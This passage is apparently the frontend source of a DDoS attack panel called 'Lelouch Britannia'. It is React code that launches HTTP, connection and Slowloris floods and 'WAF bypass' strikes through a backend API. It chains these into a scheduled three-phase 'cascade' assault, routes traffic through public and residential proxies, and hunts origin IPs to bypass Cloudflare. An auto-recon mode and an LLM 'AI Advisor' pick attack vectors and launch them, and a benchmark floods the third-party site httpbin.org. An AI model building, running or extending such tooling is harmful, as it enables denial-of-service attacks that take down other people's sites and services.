    setIsAnalyzing(true); setAnalyzeResult(null); setShowAnalyze(true);
    addLog(`👁 Intelligence gathering on ${urlToAnalyze}...`, "info");
    if (soundRef.current) playTone("tick");
    try {
      const res = await fetch(`${BASE}/api/analyze`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: urlToAnalyze }),
      });
      const data: AnalyzeResult = await res.json();
      setAnalyzeResult(data);
      const best = data.recommendations[0];
      addLog(`👁 Analysis complete: ${data.recommendations.length} vectors ranked`, "success");
      if (data.serverLabel && data.serverType !== "unknown") {
        addLog(`👁 Server identified: ${data.serverLabel}${data.serverHeader ? ` (${data.serverHeader})` : ""}`, "info");
      }
      if (best) addLog(`👁 Best method: ${best.name} [Tier ${best.tier}] — score ${best.score}/100 — ${best.reason}`, "success");
      if (data.isCDN) addLog(`⚠ CDN detected (${data.cdnProvider}) — layer 7 attacks partially mitigated`, "warn");
      if (soundRef.current) playTone("check");
    } catch { addLog("✕ Analysis failed — check backend connection.", "error"); }
    setIsAnalyzing(false);
  }
  async function handleCheckSite() {
    const urlToCheck = checkerUrl.trim() || target.trim();
    if (!urlToCheck) { addLog("✕ Enter a URL to check.", "error"); return; }
    setIsChecking(true); setCheckerResult(null);
    if (soundRef.current) playTone("tick");
    try {
      const res = await fetch(`${BASE}/api/check`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: urlToCheck }),
      });
      const data: CheckResult = await res.json();
      setCheckerResult(data);
      if (soundRef.current) playTone("check");
      addLog(
        data.up
          ? `👁 ${urlToCheck} → HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`
          : `✕ ${urlToCheck} → OFFLINE — ${data.statusText} (${data.responseTime}ms)`,
        data.up ? "success" : "error"
      );
    } catch { addLog("✕ Check failed — network error.", "error"); }
    setIsChecking(false);
  }

  async function handleBenchmark() {
    addLog("👁 Benchmark mode: testing http-flood against httpbin.org (10s)...", "info");
    const testUrl = "http://httpbin.org";
    try {
      const res = await fetch(`${BASE}/api/attacks`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: testUrl, port: 80, method: "http-flood", duration: 10, threads: 100 }),
      });
      const data = await res.json();
      addLog(`👁 Benchmark started [ID #${data.id}] — 100 threads × 10s vs httpbin.org`, "success");
      setTimeout(async () => {
        try {
          const r2 = await fetch(`${BASE}/api/attacks/${data.id}`);
          const d2 = await r2.json();
          const pps = Math.round((d2.packetsSent ?? 0) / 10);
          const mbps = ((d2.bytesSent ?? 0) * 8 / 10 / 1e6).toFixed(1);
          addLog(`👁 Benchmark result: ${fmtNum(d2.packetsSent ?? 0)} total reqs | ${fmtNum(pps)} req/s | ${mbps} Mbps`, "success");
        } catch { /**/ }
      }, 12000);
    } catch { addLog("✕ Benchmark failed.", "error"); }
  }

  /* ── Auto-Recon: analyze target then auto-configure and launch ── */
  async function handleAutoRecon() {
    const urlToAnalyze = target.trim();
    if (!urlToAnalyze) { addLog("✕ Enter a target URL first for Auto-Recon.", "error"); return; }
    if (isRunning || isCascading) { addLog("✕ Stop current attack before launching Auto-Recon.", "error"); return; }
    setIsAutoRecon(true); setIsAnalyzing(true); setShowAnalyze(true); setAnalyzeResult(null);
    addLog(`👁 AUTO-RECON: Intelligence scan on ${urlToAnalyze}...`, "info");
    try {
      const res = await fetch(`${BASE}/api/analyze`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: urlToAnalyze }),
      });
      const data: AnalyzeResult = await res.json();
      setAnalyzeResult(data);
      const best = data.recommendations[0];
      if (best) {
        setMethod(best.method);
        setThreads(best.suggestedThreads);
        setDuration(best.suggestedDuration);
        addLog(`👁 AUTO-RECON complete: ${data.recommendations.length} vectors ranked`, "success");
        if (data.serverLabel) addLog(`👁 Server: ${data.serverLabel}${data.isCDN ? ` — CDN: ${data.cdnProvider}` : ""}`, "info");
        addLog(`✅ Best vector: ${best.name} [${best.tier}] — ${best.score}/100 — ${best.reason}`, "success");
        addLog(`👁 Auto-configured: ${best.method.toUpperCase()} × ${best.suggestedThreads}T × ${best.suggestedDuration}s`, "info");
        addLog(`👁 GEASS LAUNCHING IN 2 SECONDS...`, "warn");
        if (soundRef.current) playTone("tick");
        setTimeout(() => { if (!isRunningRef.current) handleLaunch(); }, 2000);
      } else {
        addLog("⚠ No recommendations found — check target accessibility.", "warn");
      }
    } catch { addLog("✕ Auto-recon failed — backend error.", "error"); }
    setIsAnalyzing(false); setIsAutoRecon(false);
  }

  /* ── Cascade Attack: 3-phase sequential assault ── */
  async function handleCascade() {
    const tgt = target.trim();
    if (!tgt) { addLog("✕ Enter a target first for Cascade Attack.", "error"); return; }
    if (isRunning || isCascading) { addLog("✕ Stop current attack before launching Cascade.", "error"); return; }
    setIsCascading(true);
    const isHttpsTarget = /^https:/i.test(tgt);
    const tgtPort = isHttpsTarget ? 443 : 80;
    const phase1Dur = Math.max(20, Math.round(duration * 0.35));
    const phase2Dur = Math.max(15, Math.round(duration * 0.35));
    const phase3Dur = Math.max(10, duration - phase1Dur - phase2Dur);

    addLog(`👁 CASCADE PROTOCOL initiated — 3-phase assault on ${tgt}`, "info");
    addLog(`  Phase 1 (${phase1Dur}s): TLS Connection Flood — exhaust connection table`, "info");
    addLog(`  Phase 2 (${phase2Dur}s): Slowloris — hold half-open connections`, "info");
    addLog(`  Phase 3 (${phase3Dur}s): WAF Bypass — precision HTTP strike`, "info");

    if (soundRef.current) playTone("start");
    if ("vibrate" in navigator) navigator.vibrate([200, 100, 200]);

    // Phase 1: Connection Flood — immediately
    setCascadePhase(1);
    addLog(`🔴 Phase 1 ACTIVE — TLS Conn Flood launching...`, "warn");
    try {
      const r1 = await fetch(`${BASE}/api/attacks`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: tgt, port: tgtPort, method: "conn-flood", duration: phase1Dur + phase2Dur + phase3Dur, threads }),
      });
      const a1 = await r1.json() as { id: number };
      setCurrentAttackId(a1.id); setIsRunning(true); isRunningRef.current = true;
      targetRef.current = tgt; startTimeRef.current = Date.now(); durationRef.current = duration;
      currentPacketsRef.current = 0; lastPacketsRef.current = 0; peakPpsRef.current = 0;
      addLog(`👁 Phase 1 online [ID #${a1.id}]`, "success");
      saveFavorite(tgt);

      // Phase 2: Slowloris — starts after phase1
      setTimeout(async () => {
        if (!isRunningRef.current) return;
        setCascadePhase(2);
        addLog(`🔴 Phase 2 ACTIVE — Slowloris holding connections...`, "warn");
        try {
          const r2 = await fetch(`${BASE}/api/attacks`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target: tgt, port: tgtPort, method: "slowloris", duration: phase2Dur + phase3Dur, threads }),
          });
          const a2 = await r2.json() as { id: number };
          addLog(`👁 Phase 2 online [ID #${a2.id}]`, "success");
        } catch { addLog("✕ Phase 2 launch failed.", "error"); }

        // Phase 3: WAF Bypass — starts after phase1+phase2
        setTimeout(async () => {
          if (!isRunningRef.current) return;
          setCascadePhase(3);
          addLog(`🔴 Phase 3 ACTIVE — WAF Bypass precision strike...`, "warn");
          if (soundRef.current) playTone("start");
          try {
            const r3 = await fetch(`${BASE}/api/attacks`, {
              method: "POST", headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ target: tgt, port: tgtPort, method: "waf-bypass", duration: phase3Dur, threads }),
            });
            const a3 = await r3.json() as { id: number };
            addLog(`👁 Phase 3 online [ID #${a3.id}]`, "success");
          } catch { addLog("✕ Phase 3 launch failed.", "error"); }

          // Cleanup after all phases complete
          setTimeout(() => {
            setCascadePhase(0); setIsCascading(false);
            setIsRunning(false); isRunningRef.current = false;
            setProgress(0); setCurrentAttackId(null); setPps(0); setBps(0); setActiveConns(0);
            addLog(`✅ CASCADE PROTOCOL COMPLETE — all 3 phases executed`, "success");
            addToast("geass", "CASCADE COMPLETE", `3 phases on ${getDomainKey(tgt)}`);
            refetchStats(); refetchHistory();
          }, phase3Dur * 1000 + 2000);
        }, phase2Dur * 1000);
      }, phase1Dur * 1000);

    } catch {
      addLog("✕ Cascade Phase 1 launch failed.", "error");
      setIsCascading(false); setCascadePhase(0);
    }
  }

  async function handleFindOrigin() {
    if (isFindingOrigin) return;
    const rawTarget = target.trim() || "";
    if (!rawTarget) { addLog("✕ Enter a target domain to find origin IP.", "error"); return; }
    const domain = rawTarget.replace(/^https?:\/\//i,"").replace(/\/.*$/,"").trim();
    setIsFindingOrigin(true);
    setShowOriginFinder(true);
    setOriginResult(null);
    addLog(`🔍 Hunting origin IP for ${domain} — crt.sh · DNS · IPv6 · MX · SPF · subdomains...`, "info");
    try {
      const res = await fetch(`${BASE}/api/find-origin`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ domain }),
      });
      const data = await res.json() as OriginResult;
      setOriginResult(data);
      if (data.originIPs.length > 0) {
        addLog(`🎯 Origin found! ${data.originIPs.join(", ")} — attack directly to bypass Cloudflare!`, "success");
        addLog(`👁 Checked ${data.crtHostsFound} SSL cert history entries from crt.sh`, "info");
      } else if (data.isCloudflare) {
        addLog(`⚠ Target is Cloudflare-protected and origin IP is hidden. Check SecurityTrails.com manually.`, "warn");
      } else {
        addLog(`👁 No CDN detected — target is directly accessible at its DNS IP.`, "info");
      }
    } catch {
      addLog("✕ Origin finder failed — check backend connection.", "error");
    } finally {
      setIsFindingOrigin(false);
    }
  }

  async function handleFetchProxies() {
    if (proxyFetching) return;
    setProxyFetching(true);
    addLog("👁 Fetching live proxies from 5 public sources — testing connectivity...", "info");
    try {
      await fetch(`${BASE}/api/proxies/refresh`, { method: "POST" });
      // Poll until fetch completes (backend does it async after responding)
      let attempts = 0;
      const poll = setInterval(async () => {
        try {
          const r = await fetch(`${BASE}/api/proxies/count`);
          const d = await r.json() as { count: number; fetching: boolean };
          if (!d.fetching) {
            clearInterval(poll);
            // Load final list
            const r2 = await fetch(`${BASE}/api/proxies`);
            const d2 = await r2.json() as { count: number; publicCount?: number; residentialCount?: number; proxies: ProxyEntry[]; residential?: ResidentialInfo | null };
            setProxies(d2.proxies ?? []);
            if (d2.residential) setResidentialInfo(d2.residential);
            if ((d2.residentialCount ?? 0) > 0) setResidentialCount(d2.residentialCount ?? 0);
            const totalMsg = d2.residentialCount ? ` + ${d2.residentialCount} residential` : "";
            addLog(`👁 Proxy scan complete — ${d2.publicCount ?? d2.count} public${totalMsg} live proxies`, d2.count > 0 ? "success" : "warn");
            if (d2.proxies[0]) addLog(`👁 Fastest: ${d2.proxies[0].host}:${d2.proxies[0].port} (${d2.proxies[0].responseMs}ms)`, "info");
            setProxyFetching(false);
          }
        } catch { /**/ }
        if (++attempts > 40) { clearInterval(poll); setProxyFetching(false); }
      }, 3000);
    } catch {
      addLog("✕ Proxy fetch failed — check backend connection.", "error");
      setProxyFetching(false);
    }
  }

  /* ── Schedule attack ── */
  async function handleSchedule() {
    if (!target.trim()) { addLog("✕ Set a target before scheduling.", "error"); return; }
    if (!scheduleTime)  { addLog("✕ Pick a date/time for the scheduled attack.", "error"); return; }
    const fireDate = new Date(scheduleTime);
    if (fireDate <= new Date()) { addLog("✕ Scheduled time must be in the future.", "error"); return; }
    // Derive port from target URL (same logic as handleLaunch)
    const isHttps = target.trim().startsWith("https://");
    let schedPort = isHttps ? 443 : 80;
    try { const u = new URL(target.trim()); schedPort = parseInt(u.port, 10) || schedPort; } catch { /**/ }
    setScheduleLoading(true);
    try {
      const r = await fetch(`${BASE}/api/attacks/schedule`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          target: target.trim(),
          port: schedPort,
          method,
          duration,
          threads,
          scheduledFor: fireDate.toISOString(), // backend accepts ISO or epoch
        }),
      });
      const d = await r.json() as { id?: string; error?: string };
      if (d.error) throw new Error(d.error);
      addLog(`⏰ Attack scheduled [ID ${d.id}] for ${fireDate.toLocaleString()} — ${method.toUpperCase()} → ${target.trim()}`, "success");
      addToast("launch", "Attack Scheduled", `${method.toUpperCase()} fires at ${fireDate.toLocaleTimeString()}`);
      await loadScheduled();
    } catch (e: unknown) {
      addLog(`✕ Scheduling failed: ${e instanceof Error ? e.message : String(e)}`, "error");
    } finally {
      setScheduleLoading(false);
    }
  }

  async function loadScheduled() {
    try {
      const r = await fetch(`${BASE}/api/attacks/scheduled`);
      // Backend returns array directly (no wrapper object)
      const d = await r.json() as Array<{ id: string; target: string; scheduledFor: number; method: string; status?: string }>;
      const mapped = (Array.isArray(d) ? d : []).map(s => ({
        id: s.id,
        target: s.target,
        scheduledAt: new Date(s.scheduledFor).toISOString(),
        method: s.method,
        status: s.status ?? "pending",
      }));
      setScheduledList(mapped);
    } catch { /**/ }
  }

  async function cancelScheduled(id: string) {
    try {
      await fetch(`${BASE}/api/attacks/scheduled/${id}`, { method: "DELETE" });
      setScheduledList(prev => prev.filter(s => s.id !== id));
      addLog(`✕ Scheduled attack ${id} cancelled.`, "warn");
    } catch { /**/ }
  }

  /* ── AI Advisor ── */
  async function handleAiAdvisor() {
    if (!target.trim()) { addLog("✕ Set a target to get AI attack recommendations.", "error"); return; }
    setAiLoading(true); setShowAiModal(true); setAiData(null); setAiError(null);
    addLog("👁 Consulting Lelouch AI Advisor (Groq llama-3.3-70b)… probing target…", "info");
    try {
      const url = (currentAttackId !== null && currentAttackId > 0)
        ? `${BASE}/api/attacks/${currentAttackId}/ai-advisor`
        : `${BASE}/api/advisor?target=${encodeURIComponent(target.trim())}`;
      const r = await fetch(url);
      const d = await r.json() as Record<string, unknown>;
      if (d.error) throw new Error(String(d.error));
      setAiData(d);
      const sev = d.severity ? String(d.severity).toUpperCase() : "";
      const eff = d.effectiveness != null ? ` · ${d.effectiveness}% effectiveness` : "";
      addLog(`👁 AI Advisor: ${sev}${eff} — boost: ${d.boostVector ?? "—"}`, "success");
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      setAiError(msg);
      addLog(`✕ AI Advisor error: ${msg}`, "error");
    } finally {
      setAiLoading(false);
    }
  }

  /* ── Derived values ── */
  const pw = powerLevel(threads, method);
  const mi = methodInfo(method);
  const localPkts  = isRunning ? (currentAttack?.packetsSent ?? 0) : lastAtkPkts;
  const localBytes = isRunning ? (currentAttack?.bytesSent   ?? 0) : lastAtkBytes;
  const totalPackets = localPkts  + (isRunning ? clusterTotalPkts  : 0);
  const totalBytes   = localBytes + (isRunning ? clusterTotalBytes : 0);
  const totalNodes   = clusterNodes.filter(n => n.trim()).length + 1;
  const proxyUsable  = proxyEnabled && (proxies.length > 0 || residentialInfo !== null) && L7_PROXY_OK.has(method);

  // Intensity for GeassEye animation (0–1 based on pps relative to a high reference)
  const eyeIntensity = isRunning ? Math.min(1, pps / 50000) : 0;
  const sparklineColor = method === "geass-override" ? "#C0392B"
    : method === "waf-bypass"  ? "#8E44AD"
    : method === "http2-flood" ? "#1abc9c"
    : method === "slowloris"   ? "#9b59b6"
    : method === "conn-flood"  ? "#e74c3c"
    : L7_HTTP_FE.has(method)   ? "#2ecc71"
    : L4_TCP_FE.has(method)    ? "#3498db"
    : L4_UDP_FE.has(method)    ? "#e67e22"
    : "#D4AF37";
  const isUDP = L4_UDP_FE.has(method);

  /* ── JSX ── */
  /* ── Domain scores sorted by last seen ── */
  const topDomains = Object.entries(domainScores)
    .sort((a, b) => b[1].lastSeen - a[1].lastSeen)
    .slice(0, 5);

  return (
    <div className={`lb-page ${entered ? "lb-entered" : ""} ${isRunning && method === "geass-override" ? "lb-page--geass-active" : ""}`}>
      <GeassEye intensity={eyeIntensity} />
      {geassFlash && <div className="lb-geass-flash" aria-hidden="true" />}
      {isRunning && method === "geass-override" && <GeassParticles />}

      {/* ── Toast container ── */}
      {toasts.length > 0 && (
        <div className="lb-toast-container" aria-live="polite">
          {toasts.map(t => (
            <div key={t.id} className={`lb-toast lb-toast--${t.type}`}>
              <span className="lb-toast-icon">
                {t.type === "launch" ? "👁" : t.type === "stop" ? "⏹" : t.type === "geass" ? "🟣" : "ℹ"}
              </span>
              <div className="lb-toast-body">
                <div className="lb-toast-title">{t.title}</div>
                {t.msg && <div className="lb-toast-msg">{t.msg}</div>}
              </div>
              <button className="lb-toast-close" onClick={() => setToasts(prev => prev.filter(x => x.id !== t.id))}>✕</button>
            </div>
          ))}
        </div>
      )}

      <div className="lb-wrap">

        {/* ── Header ── */}
        <header className="lb-header">
          {isRunning && (
            <div className={`lb-badge ${targetStatus === "offline" ? "lb-badge--kill" : ""}`}>
              <span className="lb-badge-dot" />
              {targetStatus === "offline" ? "TARGET ELIMINATED" : method === "geass-override" ? "GEASS OVERRIDE ACTIVE" : "GEASS ACTIVE"}
            </div>
          )}
          <div className="lb-title-row">
            <img src={GEASS_SYMBOL} className="lb-header-symbol" alt="Geass" />
            <h1 className="lb-title">Lelouch Britannia</h1>
            <img src={GEASS_SYMBOL} className="lb-header-symbol lb-header-symbol--flip" alt="" aria-hidden="true"/>
          </div>
          <p className="lb-sub">Because absolute power is even more beautiful when wielded by Zero.</p>
          <button
            className="lb-theme-toggle"
            title={`Switch to ${theme === "lelouch" ? "Suzaku (navy)" : "Lelouch (crimson)"} theme`}
            onClick={() => setTheme(t => t === "lelouch" ? "suzaku" : "lelouch")}
          >
            {theme === "lelouch" ? "⚔ Suzaku Mode" : "👁 Lelouch Mode"}
          </button>
        </header>

        {/* ── Built-in Presets ── */}
        <div className="lb-presets">
          {PRESETS.map(p => (
            <button
              key={p.label}
              className={`lb-preset${p.method === "geass-override" ? " lb-preset--geass" : ""}`}
              onClick={() => applyPreset(p)}
            >
              {p.method === "geass-override"
                ? <img src={GEASS_SYMBOL} className="lb-preset-symbol" alt=""/>
                : <span>{p.icon}</span>
              }
              {p.label}
            </button>
          ))}
        </div>

        {/* ── Card ── */}
        <div className={`lb-card ${isRunning ? "lb-card--active" : ""}`}>
          {/* GIF */}
          <div className="lb-gif-wrap">
            <img src={LELOUCH_GIF} alt="Lelouch vi Britannia" className="lb-gif"/>
            <div className="lb-scanlines" aria-hidden="true"/>
            <div className="lb-gif-fade" aria-hidden="true"/>
            <img
              src={GEASS_SYMBOL}
              className={`lb-gif-symbol${isRunning && method === "geass-override" ? " lb-gif-symbol--active" : ""}`}
              aria-hidden="true" alt=""
            />
            {isRunning && (
              <div className={`lb-attack-overlay${method === "geass-override" ? " lb-attack-overlay--geass" : ""}`} aria-hidden="true">
                <span className="lb-attack-overlay-text">
                  {method === "geass-override" ? "ABSOLUTE GEASS OVERRIDE" : "ATTACK IN PROGRESS"}
                </span>
              </div>
            )}
          </div>

          <div className="lb-body">
            {/* Target */}
            <div className="lb-target-row">
              <div className="lb-input-wrap">
                <input
                  className="lb-input"
                  type="text"
                  placeholder="Enter target URL or IP address"
                  value={target}
                  onChange={e => { setTarget(e.target.value); setShowFavs(false); }}
                  onFocus={() => { if (favorites.length > 0) setShowFavs(true); }}
                  onBlur={() => setTimeout(() => setShowFavs(false), 160)}
                  onKeyDown={e => e.key === "Enter" && handleLaunch()}
                  autoComplete="off"
                />
                {showFavs && (
                  <div className="lb-favs">
                    {favorites.map(f => (
                      <div key={f} className="lb-fav-item">
                        <span className="lb-fav-url" onClick={() => { setTarget(f); setShowFavs(false); }}>{f}</span>
                        <button className="lb-fav-rm" onClick={e => { e.stopPropagation(); removeFavorite(f); }}>✕</button>
                      </div>
                    ))}
                  </div>
                )}
              </div>
              {target.trim() && !favorites.includes(target.trim()) && (
                <button className="lb-star-btn" title="Save target" onClick={() => saveFavorite(target.trim())}>★</button>
              )}
            </div>

            {/* Action row */}
            <div className="lb-action-row">
              <button
                className={`lb-btn-launch ${isRunning ? "lb-btn-stop" : ""}`}
                onClick={handleLaunch}
                disabled={createAttack.isPending}
              >
                <img src={GEASS_SYMBOL} className="lb-btn-glyph-img" alt=""/>
                {isRunning ? "ABORT GEASS" : "COMMAND GEASS"}
              </button>
              <button className="lb-btn-icon lb-btn-gold" title="Clear terminal" onClick={handleClearLogs}>⚡</button>
              <button className="lb-btn-icon lb-btn-dim"  title="Export logs"    onClick={handleExportLogs}>⎘</button>
              <button className={`lb-btn-icon ${soundEnabled ? "lb-btn-gold" : "lb-btn-dim"}`}
                title={soundEnabled ? "Mute" : "Unmute"} onClick={() => setSoundEnabled(v => !v)}>
                {soundEnabled ? "🔊" : "🔇"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-analyze ${isAnalyzing ? "lb-btn-analyzing" : ""}`}
                title="Analyze target"
                onClick={handleAnalyze}
                disabled={isAnalyzing || !target.trim()}
              >
                {isAnalyzing ? "⏳" : "🔍"}
              </button>
              <button
                className="lb-btn-icon lb-btn-bench"
                title="Quick benchmark vs httpbin.org"
                onClick={handleBenchmark}
              >⚗</button>
              <button
                className={`lb-btn-icon lb-btn-origin ${isFindingOrigin ? "lb-btn-analyzing" : ""}`}
                title="Find real origin IP behind Cloudflare (crt.sh + DNS + IPv6 + subdomains)"
                onClick={handleFindOrigin}
                disabled={isFindingOrigin || !target.trim()}
              >
                {isFindingOrigin ? "⏳" : "🕵"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-autorecon ${isAutoRecon || isAnalyzing ? "lb-btn-analyzing" : ""}`}
                title="Auto-Recon: scan target, pick best method, auto-launch"
                onClick={handleAutoRecon}
                disabled={isAutoRecon || isAnalyzing || isRunning || isCascading || !target.trim()}
              >
                {isAutoRecon ? "⏳" : "🎯"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-cascade ${isCascading ? "lb-btn-cascade--active" : ""}`}
                title={`Cascade: 3-phase assault — Conn Flood → Slowloris → WAF Bypass`}
                onClick={handleCascade}
                disabled={isRunning || isCascading || !target.trim()}
              >
                {isCascading ? `P${cascadePhase}` : "⚔"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-analyze ${aiLoading ? "lb-btn-analyzing" : ""}`}
                title="AI Advisor — Lelouch AI analyzes target and recommends best attack vectors"
                onClick={handleAiAdvisor}
                disabled={aiLoading || !target.trim()}
                style={{ background: "#1a0a2e", border: "1.5px solid #8E44AD", color: "#d8b4fe" }}
              >
                {aiLoading ? "⏳" : "🧠"}
              </button>
            </div>
            {/* Cascade phase indicator */}
            {isCascading && cascadePhase > 0 && (
              <div className="lb-cascade-bar">
                <span className={`lb-cascade-phase ${cascadePhase === 1 ? "lb-cascade-phase--active" : cascadePhase > 1 ? "lb-cascade-phase--done" : ""}`}>Conn Flood</span>
                <span className="lb-cascade-arrow">→</span>
                <span className={`lb-cascade-phase ${cascadePhase === 2 ? "lb-cascade-phase--active" : cascadePhase > 2 ? "lb-cascade-phase--done" : ""}`}>Slowloris</span>
                <span className="lb-cascade-arrow">→</span>
                <span className={`lb-cascade-phase ${cascadePhase === 3 ? "lb-cascade-phase--active" : ""}`}>WAF Bypass</span>
              </div>
            )}

            {/* ── Analyzer Panel ── */}
            {showAnalyze && (
              <div className="lb-analyzer">
                <div className="lb-analyzer-header">
                  <span className="lb-analyzer-title">👁 INTELLIGENCE ANALYSIS</span>
                  <button className="lb-analyzer-close" onClick={() => setShowAnalyze(false)}>✕</button>
                </div>

                {isAnalyzing && (
                  <div className="lb-analyzer-loading">
                    <div className="lb-analyzer-spinner"/>
                    <span>Scanning — ports, WAF, H2/H3, origin IP, GraphQL...</span>
                  </div>
                )}

                {!isAnalyzing && analyzeResult && (
                  <>
                    {/* ── Identity Row: host + IP + latency ── */}
                    <div className="lai-identity">
                      <span className="lai-host">{analyzeResult.target}</span>
                      {analyzeResult.ip && (
                        <span className="lai-ip-badge">{analyzeResult.ip}</span>
                      )}
                      {(analyzeResult.allIPs ?? []).length > 1 && (
                        <span className="lai-multi-ip">⇄ {analyzeResult.allIPs.length} IPs</span>
                      )}
                      <span className={`lai-latency lai-latency--${
                        analyzeResult.responseTimeMs === 0 ? "dead"
                        : analyzeResult.responseTimeMs > 600 ? "slow"
                        : analyzeResult.responseTimeMs > 200 ? "warn"
                        : "fast"
                      }`}>
                        {analyzeResult.responseTimeMs > 0 ? `${analyzeResult.responseTimeMs}ms` : "OFFLINE"}
                      </span>
                    </div>

                    {/* ── Server Type + Raw Header ── */}
                    {(analyzeResult.serverHeader || (analyzeResult.serverType && analyzeResult.serverType !== "unknown")) && (
                      <div className="lai-server-row">
                        {analyzeResult.serverType && analyzeResult.serverType !== "unknown" && (
                          <span className={`lai-server-badge lai-server-badge--${analyzeResult.serverType}`}>
                            {analyzeResult.serverLabel || analyzeResult.serverType}
                          </span>
                        )}
                        {analyzeResult.serverHeader && (
                          <span className="lai-server-raw">{analyzeResult.serverHeader}</span>
                        )}
                      </div>
                    )}

                    {/* ── Protocol / Feature Chips ── */}
                    <div className="lai-chips">
                      <span className={`lai-chip ${analyzeResult.httpAvailable  ? "lai-chip--on"  : "lai-chip--off"}`}>HTTP</span>
                      <span className={`lai-chip ${analyzeResult.httpsAvailable ? "lai-chip--on"  : "lai-chip--off"}`}>HTTPS</span>
                      <span className={`lai-chip ${analyzeResult.supportsH2     ? "lai-chip--on"  : "lai-chip--off"}`}>HTTP/2</span>
                      <span className={`lai-chip lai-chip--h3 ${analyzeResult.supportsH3 ? "lai-chip--on" : "lai-chip--off"}`}>HTTP/3</span>
                      <span className={`lai-chip lai-chip--ws  ${analyzeResult.hasWebSocket ? "lai-chip--on" : "lai-chip--off"}`}>WebSocket</span>
                      <span className={`lai-chip lai-chip--gql ${analyzeResult.hasGraphQL  ? "lai-chip--on" : "lai-chip--off"}`}>GraphQL</span>
                      <span className={`lai-chip lai-chip--hsts ${analyzeResult.hasHSTS    ? "lai-chip--on" : "lai-chip--off"}`}>
                        HSTS{analyzeResult.hasHSTS && analyzeResult.hstsMaxAge > 0 ? ` ${Math.round(analyzeResult.hstsMaxAge/86400)}d` : ""}
                      </span>
                      {analyzeResult.hasDNS && (
                        <span className="lai-chip lai-chip--on lai-chip--dns">DNS ✓</span>
                      )}
                    </div>

                    {/* ── CDN / WAF Threat Alerts ── */}
                    {(analyzeResult.isCDN || analyzeResult.hasWAF) && (
                      <div className="lai-threat-row">
                        {analyzeResult.isCDN && (
                          <div className="lai-threat lai-threat--cdn">
                            <span className="lai-threat-icon">☁</span>
                            <div className="lai-threat-body">
                              <span className="lai-threat-label">CDN DETECTED</span>
                              <span className="lai-threat-prov">{analyzeResult.cdnProvider}</span>
                            </div>
                            <span className="lai-threat-note">L7 edge-mitigated</span>
                          </div>
                        )}
                        {analyzeResult.hasWAF && (
                          <div className="lai-threat lai-threat--waf">
                            <span className="lai-threat-icon">🛡</span>
                            <div className="lai-threat-body">
                              <span className="lai-threat-label">WAF DETECTED</span>
                              <span className="lai-threat-prov">{analyzeResult.wafProvider}</span>
                            </div>
                            <span className="lai-threat-note">Use waf-bypass</span>
                          </div>
                        )}
                      </div>
                    )}

                    {/* ── Open Ports ── */}
                    {analyzeResult.openPorts.length > 0 && (
                      <div className="lai-ports">
                        <span className="lai-ports-label">PORTS</span>
                        <div className="lai-ports-list">
                          {analyzeResult.openPorts.map(p => (
                            <span key={p} className="lai-port">{p}</span>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* ── Origin IP Discovery ── */}
                    {analyzeResult.originIP && (
                      <div className="lai-origin">
                        <span className="lai-origin-label">🎯 ORIGIN IP — CLOUDFLARE BYPASS</span>
                        <div className="lai-origin-body">
                          <span className="lai-origin-ip">{analyzeResult.originIP}</span>
                          {analyzeResult.originSubdomain && (
                            <span className="lai-origin-sub">via {analyzeResult.originSubdomain}</span>
                          )}
                          <button className="lai-origin-use" onClick={() => {
                            setTarget(analyzeResult!.originIP!);
                            addLog(`🎯 Target → ${analyzeResult!.originIP} (origin IP — CF bypassed)`, "success");
                            setShowAnalyze(false);
                          }}>USE DIRECT</button>
                        </div>
                      </div>
                    )}

                    {/* ── Ranked Recommendations ── */}
                    <div className="lai-recs-header">
                      <span>VECTORS RANKED — {analyzeResult.recommendations.length} methods scored</span>
                    </div>
                    <div className="lb-recs">
                      {analyzeResult.recommendations.map((rec, i) => (
                        <div key={rec.method} className={`lb-rec ${i === 0 ? "lb-rec--best" : ""}`}>
                          <div className="lrec-left">
                            <span className={`lrec-tier lrec-tier--${rec.tier.toLowerCase()}`}>{rec.tier}</span>
                            <div className="lrec-info">
                              <div className="lrec-name">
                                {i === 0 && <span className="lrec-crown">★ BEST — </span>}
                                {rec.name}
                                {rec.amplification > 1 && <span className="lrec-amp">{rec.amplification}x AMP</span>}
                                <span className="lrec-proto">{rec.protocol}</span>
                              </div>
                              <div className="lrec-reason">{rec.reason}</div>
                              <div className="lrec-bar-wrap">
                                <div className="lrec-bar" style={{ width: `${rec.score}%`, background: rec.score >= 90 ? "#ff0033" : rec.score >= 75 ? "#D4AF37" : rec.score >= 60 ? "#e67e22" : "#666" }}/>
                                <span className="lrec-score">{rec.score}/100</span>
                              </div>
                            </div>
                          </div>
                          <button className={`lrec-use ${i === 0 ? "lrec-use--best" : ""}`}
                            onClick={() => {
                              setMethod(rec.method);
                              setThreads(rec.suggestedThreads);
                              setDuration(rec.suggestedDuration);
                              addLog(`👁 Applied: ${rec.name} — ${rec.suggestedThreads} threads, ${rec.suggestedDuration}s [Tier ${rec.tier}]`, "success");
                              if (soundRef.current) playTone("tick");
                              setShowAnalyze(false);
                            }}>USE</button>
                        </div>
                      ))}
                    </div>
                  </>
                )}
              </div>
            )}

            {/* ── Origin IP Finder Panel ── */}
            {showOriginFinder && (
              <div className="lb-origin-panel">
                <div className="lb-analyzer-header">
                  <span className="lb-analyzer-title">🕵 ORIGIN IP RECON — CLOUDFLARE BYPASS</span>
                  <button className="lb-analyzer-close" onClick={() => setShowOriginFinder(false)}>✕</button>
                </div>
                {isFindingOrigin && (
                  <div className="lb-analyzer-loading">
                    <div className="lb-analyzer-spinner"/>
